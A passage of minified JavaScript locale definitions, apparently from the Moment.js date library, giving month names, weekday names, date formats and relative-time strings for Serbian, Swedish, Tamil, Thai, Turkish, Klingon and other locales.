            return 1 === e ? t[0] : 2 <= e && e <= 4 ? t[1] : t[2]
        },
        translate: function(e, t, n) {
            var i = Ya.words[n];
            return 1 === n.length ? t ? i[0] : i[1] : e + " " + Ya.correctGrammaticalCase(e, i)
        }
    };
    _.defineLocale("sr", {
        months: "januar_februar_mart_april_maj_jun_jul_avgust_septembar_oktobar_novembar_decembar".split("_"),
        monthsShort: "jan._feb._mar._apr._maj_jun_jul_avg._sep._okt._nov._dec.".split("_"),
        monthsParseExact: !0,
        weekdays: "nedelja_ponedeljak_utorak_sreda_četvrtak_petak_subota".split("_"),
        weekdaysShort: "ned._pon._uto._sre._čet._pet._sub.".split("_"),
        weekdaysMin: "ne_po_ut_sr_če_pe_su".split("_"),
        weekdaysParseExact: !0,
        longDateFormat: {
            LT: "H:mm",
            LTS: "H:mm:ss",
            L: "DD.MM.YYYY",
            LL: "D. MMMM YYYY",
            LLL: "D. MMMM YYYY H:mm",
            LLLL: "dddd, D. MMMM YYYY H:mm"
        },
        calendar: {
            sameDay: "[danas u] LT",
            nextDay: "[sutra u] LT",
            nextWeek: function() {
                switch (this.day()) {
                case 0:
                    return "[u] [nedelju] [u] LT";
                case 3:
                    return "[u] [sredu] [u] LT";
                case 6:
                    return "[u] [subotu] [u] LT";
                case 1:
                case 2:
                case 4:
                case 5:
                    return "[u] dddd [u] LT"
                }
            },
            lastDay: "[juče u] LT",
            lastWeek: function() {
                return ["[prošle] [nedelje] [u] LT", "[prošlog] [ponedeljka] [u] LT", "[prošlog] [utorka] [u] LT", "[prošle] [srede] [u] LT", "[prošlog] [četvrtka] [u] LT", "[prošlog] [petka] [u] LT", "[prošle] [subote] [u] LT"][this.day()]
            },
            sameElse: "L"
        },
        relativeTime: {
            future: "za %s",
            past: "pre %s",
            s: "nekoliko sekundi",
            m: Ya.translate,
            mm: Ya.translate,
            h: Ya.translate,
            hh: Ya.translate,
            d: "dan",
            dd: Ya.translate,
            M: "mesec",
            MM: Ya.translate,
            y: "godinu",
            yy: Ya.translate
        },
        ordinalParse: /\d{1,2}\./,
        ordinal: "%d.",
        week: {
            dow: 1,
            doy: 7
        }
    }),
    _.defineLocale("ss", {
        months: "Bhimbidvwane_Indlovana_Indlov'lenkhulu_Mabasa_Inkhwekhweti_Inhlaba_Kholwane_Ingci_Inyoni_Imphala_Lweti_Ingongoni".split("_"),
        monthsShort: "Bhi_Ina_Inu_Mab_Ink_Inh_Kho_Igc_Iny_Imp_Lwe_Igo".split("_"),
        weekdays: "Lisontfo_Umsombuluko_Lesibili_Lesitsatfu_Lesine_Lesihlanu_Umgcibelo".split("_"),
        weekdaysShort: "Lis_Umb_Lsb_Les_Lsi_Lsh_Umg".split("_"),
        weekdaysMin: "Li_Us_Lb_Lt_Ls_Lh_Ug".split("_"),
        weekdaysParseExact: !0,
        longDateFormat: {
            LT: "h:mm A",
            LTS: "h:mm:ss A",
            L: "DD/MM/YYYY",
            LL: "D MMMM YYYY",
            LLL: "D MMMM YYYY h:mm A",
            LLLL: "dddd, D MMMM YYYY h:mm A"
        },
        calendar: {
            sameDay: "[Namuhla nga] LT",
            nextDay: "[Kusasa nga] LT",
            nextWeek: "dddd [nga] LT",
            lastDay: "[Itolo nga] LT",
            lastWeek: "dddd [leliphelile] [nga] LT",
            sameElse: "L"
        },
        relativeTime: {
            future: "nga %s",
            past: "wenteka nga %s",
            s: "emizuzwana lomcane",
            m: "umzuzu",
            mm: "%d emizuzu",
            h: "lihora",
            hh: "%d emahora",
            d: "lilanga",
            dd: "%d emalanga",
            M: "inyanga",
            MM: "%d tinyanga",
            y: "umnyaka",
            yy: "%d iminyaka"
        },
        meridiemParse: /ekuseni|emini|entsambama|ebusuku/,
        meridiem: function(e, t, n) {
            return e < 11 ? "ekuseni" : e < 15 ? "emini" : e < 19 ? "entsambama" : "ebusuku"
        },
        meridiemHour: function(e, t) {
            return 12 === e && (e = 0),
            "ekuseni" === t ? e : "emini" === t ? 11 <= e ? e : e + 12 : "entsambama" === t || "ebusuku" === t ? 0 === e ? 0 : e + 12 : void 0
        },
        ordinalParse: /\d{1,2}/,
        ordinal: "%d",
        week: {
            dow: 1,
            doy: 4
        }
    }),
    _.defineLocale("sv", {
        months: "januari_februari_mars_april_maj_juni_juli_augusti_september_oktober_november_december".split("_"),
        monthsShort: "jan_feb_mar_apr_maj_jun_jul_aug_sep_okt_nov_dec".split("_"),
        weekdays: "söndag_måndag_tisdag_onsdag_torsdag_fredag_lördag".split("_"),
        weekdaysShort: "sön_mån_tis_ons_tor_fre_lör".split("_"),
        weekdaysMin: "sö_må_ti_on_to_fr_lö".split("_"),
        longDateFormat: {
            LT: "HH:mm",
            LTS: "HH:mm:ss",
            L: "YYYY-MM-DD",
            LL: "D MMMM YYYY",
            LLL: "D MMMM YYYY [kl.] HH:mm",
            LLLL: "dddd D MMMM YYYY [kl.] HH:mm",
            lll: "D MMM YYYY HH:mm",
            llll: "ddd D MMM YYYY HH:mm"
        },
        calendar: {
            sameDay: "[Idag] LT",
            nextDay: "[Imorgon] LT",
            lastDay: "[Igår] LT",
            nextWeek: "[På] dddd LT",
            lastWeek: "[I] dddd[s] LT",
            sameElse: "L"
        },
        relativeTime: {
            future: "om %s",
            past: "för %s sedan",
            s: "några sekunder",
            m: "en minut",
            mm: "%d minuter",
            h: "en timme",
            hh: "%d timmar",
            d: "en dag",
            dd: "%d dagar",
            M: "en månad",
            MM: "%d månader",
            y: "ett år",
            yy: "%d år"
        },
        ordinalParse: /\d{1,2}(e|a)/,
        ordinal: function(e) {
            var t = e % 10;
            return e + (1 != ~~(e % 100 / 10) && (1 == t || 2 == t) ? "a" : "e")
        },
        week: {
            dow: 1,
            doy: 4
        }
    }),
    _.defineLocale("sw", {
        months: "Januari_Februari_Machi_Aprili_Mei_Juni_Julai_Agosti_Septemba_Oktoba_Novemba_Desemba".split("_"),
        monthsShort: "Jan_Feb_Mac_Apr_Mei_Jun_Jul_Ago_Sep_Okt_Nov_Des".split("_"),
        weekdays: "Jumapili_Jumatatu_Jumanne_Jumatano_Alhamisi_Ijumaa_Jumamosi".split("_"),
        weekdaysShort: "Jpl_Jtat_Jnne_Jtan_Alh_Ijm_Jmos".split("_"),
        weekdaysMin: "J2_J3_J4_J5_Al_Ij_J1".split("_"),
        weekdaysParseExact: !0,
        longDateFormat: {
            LT: "HH:mm",
            LTS: "HH:mm:ss",
            L: "DD.MM.YYYY",
            LL: "D MMMM YYYY",
            LLL: "D MMMM YYYY HH:mm",
            LLLL: "dddd, D MMMM YYYY HH:mm"
        },
        calendar: {
            sameDay: "[leo saa] LT",
            nextDay: "[kesho saa] LT",
            nextWeek: "[wiki ijayo] dddd [saat] LT",
            lastDay: "[jana] LT",
            lastWeek: "[wiki iliyopita] dddd [saat] LT",
            sameElse: "L"
        },
        relativeTime: {
            future: "%s baadaye",
            past: "tokea %s",
            s: "hivi punde",
            m: "dakika moja",
            mm: "dakika %d",
            h: "saa limoja",
            hh: "masaa %d",
            d: "siku moja",
            dd: "masiku %d",
            M: "mwezi mmoja",
            MM: "miezi %d",
            y: "mwaka mmoja",
            yy: "miaka %d"
        },
        week: {
            dow: 1,
            doy: 7
        }
    });
    var wa = {
        1: "௧",
        2: "௨",
        3: "௩",
        4: "௪",
        5: "௫",
        6: "௬",
        7: "௭",
        8: "௮",
        9: "௯",
        0: "௦"
    }
      , Ta = {
        "௧": "1",
        "௨": "2",
        "௩": "3",
        "௪": "4",
        "௫": "5",
        "௬": "6",
        "௭": "7",
        "௮": "8",
        "௯": "9",
        "௦": "0"
    };
    _.defineLocale("ta", {
        months: "ஜனவரி_பிப்ரவரி_மார்ச்_ஏப்ரல்_மே_ஜூன்_ஜூலை_ஆகஸ்ட்_செப்டெம்பர்_அக்டோபர்_நவம்பர்_டிசம்பர்".split("_"),
        monthsShort: "ஜனவரி_பிப்ரவரி_மார்ச்_ஏப்ரல்_மே_ஜூன்_ஜூலை_ஆகஸ்ட்_செப்டெம்பர்_அக்டோபர்_நவம்பர்_டிசம்பர்".split("_"),
        weekdays: "ஞாயிற்றுக்கிழமை_திங்கட்கிழமை_செவ்வாய்கிழமை_புதன்கிழமை_வியாழக்கிழமை_வெள்ளிக்கிழமை_சனிக்கிழமை".split("_"),
        weekdaysShort: "ஞாயிறு_திங்கள்_செவ்வாய்_புதன்_வியாழன்_வெள்ளி_சனி".split("_"),
        weekdaysMin: "ஞா_தி_செ_பு_வி_வெ_ச".split("_"),
        longDateFormat: {
            LT: "HH:mm",
            LTS: "HH:mm:ss",
            L: "DD/MM/YYYY",
            LL: "D MMMM YYYY",
            LLL: "D MMMM YYYY, HH:mm",
            LLLL: "dddd, D MMMM YYYY, HH:mm"
        },
        calendar: {
            sameDay: "[இன்று] LT",
            nextDay: "[நாளை] LT",
            nextWeek: "dddd, LT",
            lastDay: "[நேற்று] LT",
            lastWeek: "[கடந்த வாரம்] dddd, LT",
            sameElse: "L"
        },
        relativeTime: {
            future: "%s இல்",
            past: "%s முன்",
            s: "ஒரு சில விநாடிகள்",
            m: "ஒரு நிமிடம்",
            mm: "%d நிமிடங்கள்",
            h: "ஒரு மணி நேரம்",
            hh: "%d மணி நேரம்",
            d: "ஒரு நாள்",
            dd: "%d நாட்கள்",
            M: "ஒரு மாதம்",
            MM: "%d மாதங்கள்",
            y: "ஒரு வருடம்",
            yy: "%d ஆண்டுகள்"
        },
        ordinalParse: /\d{1,2}வது/,
        ordinal: function(e) {
            return e + "வது"
        },
        preparse: function(e) {
            return e.replace(/[௧௨௩௪௫௬௭௮௯௦]/g, function(e) {
                return Ta[e]
            })
        },
        postformat: function(e) {
            return e.replace(/\d/g, function(e) {
                return wa[e]
            })
        },
        meridiemParse: /யாமம்|வைகறை|காலை|நண்பகல்|எற்பாடு|மாலை/,
        meridiem: function(e, t, n) {
            return e < 2 ? " யாமம்" : e < 6 ? " வைகறை" : e < 10 ? " காலை" : e < 14 ? " நண்பகல்" : e < 18 ? " எற்பாடு" : e < 22 ? " மாலை" : " யாமம்"
        },
        meridiemHour: function(e, t) {
            return 12 === e && (e = 0),
            "யாமம்" === t ? e < 2 ? e : e + 12 : "வைகறை" === t || "காலை" === t || "நண்பகல்" === t && 10 <= e ? e : e + 12
        },
        week: {
            dow: 0,
            doy: 6
        }
    }),
    _.defineLocale("te", {
        months: "జనవరి_ఫిబ్రవరి_మార్చి_ఏప్రిల్_మే_జూన్_జూలై_ఆగస్టు_సెప్టెంబర్_అక్టోబర్_నవంబర్_డిసెంబర్".split("_"),
        monthsShort: "జన._ఫిబ్ర._మార్చి_ఏప్రి._మే_జూన్_జూలై_ఆగ._సెప్._అక్టో._నవ._డిసె.".split("_"),
        monthsParseExact: !0,
        weekdays: "ఆదివారం_సోమవారం_మంగళవారం_బుధవారం_గురువారం_శుక్రవారం_శనివారం".split("_"),
        weekdaysShort: "ఆది_సోమ_మంగళ_బుధ_గురు_శుక్ర_శని".split("_"),
        weekdaysMin: "ఆ_సో_మం_బు_గు_శు_శ".split("_"),
        longDateFormat: {
            LT: "A h:mm",
            LTS: "A h:mm:ss",
            L: "DD/MM/YYYY",
            LL: "D MMMM YYYY",
            LLL: "D MMMM YYYY, A h:mm",
            LLLL: "dddd, D MMMM YYYY, A h:mm"
        },
        calendar: {
            sameDay: "[నేడు] LT",
            nextDay: "[రేపు] LT",
            nextWeek: "dddd, LT",
            lastDay: "[నిన్న] LT",
            lastWeek: "[గత] dddd, LT",
            sameElse: "L"
        },
        relativeTime: {
            future: "%s లో",
            past: "%s క్రితం",
            s: "కొన్ని క్షణాలు",
            m: "ఒక నిమిషం",
            mm: "%d నిమిషాలు",
            h: "ఒక గంట",
            hh: "%d గంటలు",
            d: "ఒక రోజు",
            dd: "%d రోజులు",
            M: "ఒక నెల",
            MM: "%d నెలలు",
            y: "ఒక సంవత్సరం",
            yy: "%d సంవత్సరాలు"
        },
        ordinalParse: /\d{1,2}వ/,
        ordinal: "%dవ",
        meridiemParse: /రాత్రి|ఉదయం|మధ్యాహ్నం|సాయంత్రం/,
        meridiemHour: function(e, t) {
            return 12 === e && (e = 0),
            "రాత్రి" === t ? e < 4 ? e : e + 12 : "ఉదయం" === t ? e : "మధ్యాహ్నం" === t ? 10 <= e ? e : e + 12 : "సాయంత్రం" === t ? e + 12 : void 0
        },
        meridiem: function(e, t, n) {
            return e < 4 ? "రాత్రి" : e < 10 ? "ఉదయం" : e < 17 ? "మధ్యాహ్నం" : e < 20 ? "సాయంత్రం" : "రాత్రి"
        },
        week: {
            dow: 0,
            doy: 6
        }
    }),
    _.defineLocale("tet", {
        months: "Janeiru_Fevereiru_Marsu_Abril_Maiu_Juniu_Juliu_Augustu_Setembru_Outubru_Novembru_Dezembru".split("_"),
        monthsShort: "Jan_Fev_Mar_Abr_Mai_Jun_Jul_Aug_Set_Out_Nov_Dez".split("_"),
        weekdays: "Domingu_Segunda_Tersa_Kuarta_Kinta_Sexta_Sabadu".split("_"),
        weekdaysShort: "Dom_Seg_Ters_Kua_Kint_Sext_Sab".split("_"),
        weekdaysMin: "Do_Seg_Te_Ku_Ki_Sex_Sa".split("_"),
        longDateFormat: {
            LT: "HH:mm",
            LTS: "HH:mm:ss",
            L: "DD/MM/YYYY",
            LL: "D MMMM YYYY",
            LLL: "D MMMM YYYY HH:mm",
            LLLL: "dddd, D MMMM YYYY HH:mm"
        },
        calendar: {
            sameDay: "[Ohin iha] LT",
            nextDay: "[Aban iha] LT",
            nextWeek: "dddd [iha] LT",
            lastDay: "[Horiseik iha] LT",
            lastWeek: "dddd [semana kotuk] [iha] LT",
            sameElse: "L"
        },
        relativeTime: {
            future: "iha %s",
            past: "%s liuba",
            s: "minutu balun",
            m: "minutu ida",
            mm: "minutus %d",
            h: "horas ida",
            hh: "horas %d",
            d: "loron ida",
            dd: "loron %d",
            M: "fulan ida",
            MM: "fulan %d",
            y: "tinan ida",
            yy: "tinan %d"
        },
        ordinalParse: /\d{1,2}(st|nd|rd|th)/,
        ordinal: function(e) {
            var t = e % 10;
            return e + (1 == ~~(e % 100 / 10) ? "th" : 1 == t ? "st" : 2 == t ? "nd" : 3 == t ? "rd" : "th")
        },
        week: {
            dow: 1,
            doy: 4
        }
    }),
    _.defineLocale("th", {
        months: "มกราคม_กุมภาพันธ์_มีนาคม_เมษายน_พฤษภาคม_มิถุนายน_กรกฎาคม_สิงหาคม_กันยายน_ตุลาคม_พฤศจิกายน_ธันวาคม".split("_"),
        monthsShort: "ม.ค._ก.พ._มี.ค._เม.ย._พ.ค._มิ.ย._ก.ค._ส.ค._ก.ย._ต.ค._พ.ย._ธ.ค.".split("_"),
        monthsParseExact: !0,
        weekdays: "อาทิตย์_จันทร์_อังคาร_พุธ_พฤหัสบดี_ศุกร์_เสาร์".split("_"),
        weekdaysShort: "อาทิตย์_จันทร์_อังคาร_พุธ_พฤหัส_ศุกร์_เสาร์".split("_"),
        weekdaysMin: "อา._จ._อ._พ._พฤ._ศ._ส.".split("_"),
        weekdaysParseExact: !0,
        longDateFormat: {
            LT: "H:mm",
            LTS: "H:mm:ss",
            L: "YYYY/MM/DD",
            LL: "D MMMM YYYY",
            LLL: "D MMMM YYYY เวลา H:mm",
            LLLL: "วันddddที่ D MMMM YYYY เวลา H:mm"
        },
        meridiemParse: /ก่อนเที่ยง|หลังเที่ยง/,
        isPM: function(e) {
            return "หลังเที่ยง" === e
        },
        meridiem: function(e, t, n) {
            return e < 12 ? "ก่อนเที่ยง" : "หลังเที่ยง"
        },
        calendar: {
            sameDay: "[วันนี้ เวลา] LT",
            nextDay: "[พรุ่งนี้ เวลา] LT",
            nextWeek: "dddd[หน้า เวลา] LT",
            lastDay: "[เมื่อวานนี้ เวลา] LT",
            lastWeek: "[วัน]dddd[ที่แล้ว เวลา] LT",
            sameElse: "L"
        },
        relativeTime: {
            future: "อีก %s",
            past: "%sที่แล้ว",
            s: "ไม่กี่วินาที",
            m: "1 นาที",
            mm: "%d นาที",
            h: "1 ชั่วโมง",
            hh: "%d ชั่วโมง",
            d: "1 วัน",
            dd: "%d วัน",
            M: "1 เดือน",
            MM: "%d เดือน",
            y: "1 ปี",
            yy: "%d ปี"
        }
    }),
    _.defineLocale("tl-ph", {
        months: "Enero_Pebrero_Marso_Abril_Mayo_Hunyo_Hulyo_Agosto_Setyembre_Oktubre_Nobyembre_Disyembre".split("_"),
        monthsShort: "Ene_Peb_Mar_Abr_May_Hun_Hul_Ago_Set_Okt_Nob_Dis".split("_"),
        weekdays: "Linggo_Lunes_Martes_Miyerkules_Huwebes_Biyernes_Sabado".split("_"),
        weekdaysShort: "Lin_Lun_Mar_Miy_Huw_Biy_Sab".split("_"),
        weekdaysMin: "Li_Lu_Ma_Mi_Hu_Bi_Sab".split("_"),
        longDateFormat: {
            LT: "HH:mm",
            LTS: "HH:mm:ss",
            L: "MM/D/YYYY",
            LL: "MMMM D, YYYY",
            LLL: "MMMM D, YYYY HH:mm",
            LLLL: "dddd, MMMM DD, YYYY HH:mm"
        },
        calendar: {
            sameDay: "LT [ngayong araw]",
            nextDay: "[Bukas ng] LT",
            nextWeek: "LT [sa susunod na] dddd",
            lastDay: "LT [kahapon]",
            lastWeek: "LT [noong nakaraang] dddd",
            sameElse: "L"
        },
        relativeTime: {
            future: "sa loob ng %s",
            past: "%s ang nakalipas",
            s: "ilang segundo",
            m: "isang minuto",
            mm: "%d minuto",
            h: "isang oras",
            hh: "%d oras",
            d: "isang araw",
            dd: "%d araw",
            M: "isang buwan",
            MM: "%d buwan",
            y: "isang taon",
            yy: "%d taon"
        },
        ordinalParse: /\d{1,2}/,
        ordinal: function(e) {
            return e
        },
        week: {
            dow: 1,
            doy: 4
        }
    });
    var Sa = "pagh_wa’_cha’_wej_loS_vagh_jav_Soch_chorgh_Hut".split("_");
    _.defineLocale("tlh", {
        months: "tera’ jar wa’_tera’ jar cha’_tera’ jar wej_tera’ jar loS_tera’ jar vagh_tera’ jar jav_tera’ jar Soch_tera’ jar chorgh_tera’ jar Hut_tera’ jar wa’maH_tera’ jar wa’maH wa’_tera’ jar wa’maH cha’".split("_"),
        monthsShort: "jar wa’_jar cha’_jar wej_jar loS_jar vagh_jar jav_jar Soch_jar chorgh_jar Hut_jar wa’maH_jar wa’maH wa’_jar wa’maH cha’".split("_"),
        monthsParseExact: !0,
        weekdays: "lojmItjaj_DaSjaj_povjaj_ghItlhjaj_loghjaj_buqjaj_ghInjaj".split("_"),
        weekdaysShort: "lojmItjaj_DaSjaj_povjaj_ghItlhjaj_loghjaj_buqjaj_ghInjaj".split("_"),
        weekdaysMin: "lojmItjaj_DaSjaj_povjaj_ghItlhjaj_loghjaj_buqjaj_ghInjaj".split("_"),
        longDateFormat: {
            LT: "HH:mm",
            LTS: "HH:mm:ss",
            L: "DD.MM.YYYY",
            LL: "D MMMM YYYY",
            LLL: "D MMMM YYYY HH:mm",
            LLLL: "dddd, D MMMM YYYY HH:mm"
        },
        calendar: {
            sameDay: "[DaHjaj] LT",
            nextDay: "[wa’leS] LT",
            nextWeek: "LLL",
            lastDay: "[wa’Hu’] LT",
            lastWeek: "LLL",
            sameElse: "L"
        },
        relativeTime: {
            future: function(e) {
                var t = e;
                return -1 !== e.indexOf("jaj") ? t.slice(0, -3) + "leS" : -1 !== e.indexOf("jar") ? t.slice(0, -3) + "waQ" : -1 !== e.indexOf("DIS") ? t.slice(0, -3) + "nem" : t + " pIq"
            },
            past: function(e) {
                var t = e;
                return -1 !== e.indexOf("jaj") ? t.slice(0, -3) + "Hu’" : -1 !== e.indexOf("jar") ? t.slice(0, -3) + "wen" : -1 !== e.indexOf("DIS") ? t.slice(0, -3) + "ben" : t + " ret"
            },
            s: "puS lup",
            m: "wa’ tup",
            mm: bt,
            h: "wa’ rep",
            hh: bt,
            d: "wa’ jaj",
            dd: bt,
            M: "wa’ jar",
            MM: bt,
            y: "wa’ DIS",
            yy: bt
        },
        ordinalParse: /\d{1,2}\./,
        ordinal: "%d.",
        week: {
            dow: 1,
            doy: 4
        }
    });
    var xa = {
        1: "'inci",
        5: "'inci",
        8: "'inci",
        70: "'inci",
        80: "'inci",
        2: "'nci",
        7: "'nci",
        20: "'nci",
        50: "'nci",
        3: "'üncü",
        4: "'üncü",
        100: "'üncü",
        6: "'ncı",
        9: "'uncu",
        10: "'uncu",
        30: "'uncu",
        60: "'ıncı",
        90: "'ıncı"
    };
    return _.defineLocale("tr", {
        months: "Ocak_Şubat_Mart_Nisan_Mayıs_Haziran_Temmuz_Ağustos_Eylül_Ekim_Kasım_Aralık".split("_"),
        monthsShort: "Oca_Şub_Mar_Nis_May_Haz_Tem_Ağu_Eyl_Eki_Kas_Ara".split("_"),
        weekdays: "Pazar_Pazartesi_Salı_Çarşamba_Perşembe_Cuma_Cumartesi".split("_"),
        weekdaysShort: "Paz_Pts_Sal_Çar_Per_Cum_Cts".split("_"),
        weekdaysMin: "Pz_Pt_Sa_Ça_Pe_Cu_Ct".split("_"),
        longDateFormat: {
            LT: "HH:mm",
            LTS: "HH:mm:ss",
            L: "DD.MM.YYYY",
            LL: "D MMMM YYYY",
            LLL: "D MMMM YYYY HH:mm",
            LLLL: "dddd, D MMMM YYYY HH:mm"
        },
        calendar: {
            sameDay: "[bugün saat] LT",
            nextDay: "[yarın saat] LT",
            nextWeek: "[haftaya] dddd [saat] LT",
            lastDay: "[dün] LT",
            lastWeek: "[geçen hafta] dddd [saat] LT",
            sameElse: "L"
        },
        relativeTime: {
            future: "%s sonra",
            past: "%s önce",
            s: "birkaç saniye",
            m: "bir dakika",
            mm: "%d dakika",
            h: "bir saat",
            hh: "%d saat",
            d: "bir gün",
            dd: "%d gün",
            M: "bir ay",
            MM: "%d ay",
            y: "bir yıl",
            yy: "%d yıl"
        },
        ordinalParse: /\d{1,2}'(inci|nci|üncü|ncı|uncu|ıncı)/,
        ordinal: function(e) {
            if (0 === e)
                return e + "'ıncı";
            var t = e % 10;
            return e + (xa[t] || xa[e % 100 - t] || xa[100 <= e ? 100 : null])
        },
        week: {
            dow: 1,
            doy: 7
        }
    }),
    _.defineLocale("tzl", {
        months: "Januar_Fevraglh_Març_Avrïu_Mai_Gün_Julia_Guscht_Setemvar_Listopäts_Noemvar_Zecemvar".split("_"),
        monthsShort: "Jan_Fev_Mar_Avr_Mai_Gün_Jul_Gus_Set_Lis_Noe_Zec".split("_"),
        weekdays: "Súladi_Lúneçi_Maitzi_Márcuri_Xhúadi_Viénerçi_Sáturi".split("_"),
        weekdaysShort: "Súl_Lún_Mai_Már_Xhú_Vié_Sát".split("_"),
        weekdaysMin: "Sú_Lú_Ma_Má_Xh_Vi_Sá".split("_"),
        longDateFormat: {
            LT: "HH.mm",
            LTS: "HH.mm.ss",
            L: "DD.MM.YYYY",
            LL: "D. MMMM [dallas] YYYY",
            LLL: "D. MMMM [dallas] YYYY HH.mm",
            LLLL: "dddd, [li] D. MMMM [dallas] YYYY HH.mm"
        },
        meridiemParse: /d\'o|d\'a/i,
        isPM: function(e) {
            return "d'o" === e.toLowerCase()
        },
        meridiem: function(e, t, n) {
            return 11 < e ? n ? "d'o" : "D'O" : n ? "d'a" : "D'A"
        },
        calendar: {
            sameDay: "[oxhi à] LT",
            nextDay: "[demà à] LT",
            nextWeek: "dddd [à] LT",
            lastDay: "[ieiri à] LT",
            lastWeek: "[sür el] dddd [lasteu à] LT",
            sameElse: "L"
        },
        relativeTime: {
            future: "osprei %s",
            past: "ja%s",
            s: kt,
            m: kt,
            mm: kt,
            h: kt,
            hh: kt,
            d: kt,
            dd: kt,
            M: kt,
            MM: kt,
            y: kt,
            yy: kt
        },
        ordinalParse: /\d{1,2}\./,
        ordinal: "%d.",
        week: {
            dow: 1,
            doy: 4
        }
    }),
    _.defineLocale("tzm-latn", {
        months: "innayr_brˤayrˤ_marˤsˤ_ibrir_mayyw_ywnyw_ywlywz_ɣwšt_šwtanbir_ktˤwbrˤ_nwwanbir_dwjnbir".split("_"),
        monthsShort: "innayr_brˤayrˤ_marˤsˤ_ibrir_mayyw_ywnyw_ywlywz_ɣwšt_šwtanbir_ktˤwbrˤ_nwwanbir_dwjnbir".split("_"),
        weekdays: "asamas_aynas_asinas_akras_akwas_asimwas_asiḍyas".split("_"),
        weekdaysShort: "asamas_aynas_asinas_akras_akwas_asimwas_asiḍyas".split("_"),
        weekdaysMin: "asamas_aynas_asinas_akras_akwas_asimwas_asiḍyas".split("_"),
        longDateFormat: {
            LT: "HH:mm",
            LTS: "HH:mm:ss",
            L: "DD/MM/YYYY",
            LL: "D MMMM YYYY",
            LLL: "D MMMM YYYY HH:mm",
            LLLL: "dddd D MMMM YYYY HH:mm"
        },
        calendar: {
            sameDay: "[asdkh g] LT",
            nextDay: "[aska g] LT",
            nextWeek: "dddd [g] LT",
            lastDay: "[assant g] LT",
            lastWeek: "dddd [g] LT",
            sameElse: "L"
        },
        relativeTime: {
            future: "dadkh s yan %s",
            past: "yan %s",
            s: "imik",
            m: "minuḍ",
            mm: "%d minuḍ",
            h: "saɛa",
            hh: "%d tassaɛin",
            d: "ass",
            dd: "%d ossan",
            M: "ayowr",
            MM: "%d iyyirn",
            y: "asgas",
            yy: "%d isgasn"
        },
        week: {
            dow: 6,
            doy: 12
        }
    }),
    _.defineLocale("tzm", {
        months: "ⵉⵏⵏⴰⵢⵔ_ⴱⵕⴰⵢⵕ_ⵎⴰⵕⵚ_ⵉⴱⵔⵉⵔ_ⵎⴰⵢⵢⵓ_ⵢⵓⵏⵢⵓ_ⵢⵓⵍⵢⵓⵣ_ⵖⵓⵛⵜ_ⵛⵓⵜⴰⵏⴱⵉⵔ_ⴽⵟⵓⴱⵕ_ⵏⵓⵡⴰⵏⴱⵉⵔ_ⴷⵓⵊⵏⴱⵉⵔ".split("_"),
        monthsShort: "ⵉⵏⵏⴰⵢⵔ_ⴱⵕⴰⵢⵕ_ⵎⴰⵕⵚ_ⵉⴱⵔⵉⵔ_ⵎⴰⵢⵢⵓ_ⵢⵓⵏⵢⵓ_ⵢⵓⵍⵢⵓⵣ_ⵖⵓⵛⵜ_ⵛⵓⵜⴰⵏⴱⵉⵔ_ⴽⵟⵓⴱⵕ_ⵏⵓⵡⴰⵏⴱⵉⵔ_ⴷⵓⵊⵏⴱⵉⵔ".split("_"),
        weekdays: "ⴰⵙⴰⵎⴰⵙ_ⴰⵢⵏⴰⵙ_ⴰⵙⵉⵏⴰⵙ_ⴰⴽⵔⴰⵙ_ⴰⴽⵡⴰⵙ_ⴰⵙⵉⵎⵡⴰⵙ_ⴰⵙⵉⴹⵢⴰⵙ".split("_"),
        weekdaysShort: "ⴰⵙⴰⵎⴰⵙ_ⴰⵢⵏⴰⵙ_ⴰⵙⵉⵏⴰⵙ_ⴰⴽⵔⴰⵙ_ⴰⴽⵡⴰⵙ_ⴰⵙⵉⵎⵡⴰⵙ_ⴰⵙⵉⴹⵢⴰⵙ".split("_"),
        weekdaysMin: "ⴰⵙⴰⵎⴰⵙ_ⴰⵢⵏⴰⵙ_ⴰⵙⵉⵏⴰⵙ_ⴰⴽⵔⴰⵙ_ⴰⴽⵡⴰⵙ_ⴰⵙⵉⵎⵡⴰⵙ_ⴰⵙⵉⴹⵢⴰⵙ".split("_"),
        longDateFormat: {
            LT: "HH:mm",
            LTS: "HH:mm:ss",
            L: "DD/MM/YYYY",
            LL: "D MMMM YYYY",
            LLL: "D MMMM YYYY HH:mm",
            LLLL: "dddd D MMMM YYYY HH:mm"
        },
        calendar: {
            sameDay: "[ⴰⵙⴷⵅ ⴴ] LT",
            nextDay: "[ⴰⵙⴽⴰ ⴴ] LT",
            nextWeek: "dddd [ⴴ] LT",
            lastDay: "[ⴰⵚⴰⵏⵜ ⴴ] LT",
            lastWeek: "dddd [ⴴ] LT",
            sameElse: "L"
        },
        relativeTime: {
            future: "ⴷⴰⴷⵅ ⵙ ⵢⴰⵏ %s",
            past: "ⵢⴰⵏ %s",
            s: "ⵉⵎⵉⴽ",
            m: "ⵎⵉⵏⵓⴺ",
            mm: "%d ⵎⵉⵏⵓⴺ",
            h: "ⵙⴰⵄⴰ",
            hh: "%d ⵜⴰⵙⵙⴰⵄⵉⵏ",
            d: "ⴰⵙⵙ",
            dd: "%d oⵙⵙⴰⵏ",
            M: "ⴰⵢoⵓⵔ",
            MM: "%d ⵉⵢⵢⵉⵔⵏ",
            y: "ⴰⵙⴳⴰⵙ",
            yy: "%d ⵉⵙⴳⴰⵙⵏ"
        },
        week: {
            dow: 6,
            doy: 12
        }
    }),
    _.defineLocale("uk", {
        months: {
            format: "січня_лютого_березня_квітня_травня_червня_липня_серпня_вересня_жовтня_листопада_грудня".split("_"),
            standalone: "січень_лютий_березень_квітень_травень_червень_липень_серпень_вересень_жовтень_листопад_грудень".split("_")
        },
        monthsShort: "січ_лют_бер_квіт_трав_черв_лип_серп_вер_жовт_лист_груд".split("_"),
        weekdays: function(e, t) {
            return {
                nominative: "неділя_понеділок_вівторок_середа_четвер_п’ятниця_субота".split("_"),
                accusative: "неділю_понеділок_вівторок_середу_четвер_п’ятницю_суботу".split("_"),
                genitive: "неділі_понеділка_вівторка_середи_четверга_п’ятниці_суботи".split("_")
            }[/(\[[ВвУу]\]) ?dddd/.test(t) ? "accusative" : /\[?(?:минулої|наступної)? ?\] ?dddd/.test(t) ? "genitive" : "nominative"][e.day()]
        },
        weekdaysShort: "нд_пн_вт_ср_чт_пт_сб".split("_"),
        weekdaysMin: "нд_пн_вт_ср_чт_пт_сб".split("_"),
        longDateFormat: {
            LT: "HH:mm",
            LTS: "HH:mm:ss",
            L: "DD.MM.YYYY",
            LL: "D MMMM YYYY р.",
            LLL: "D MMMM YYYY р., HH:mm",
            LLLL: "dddd, D MMMM YYYY р., HH:mm"
        },
        calendar: {
            sameDay: Yt("[Сьогодні "),
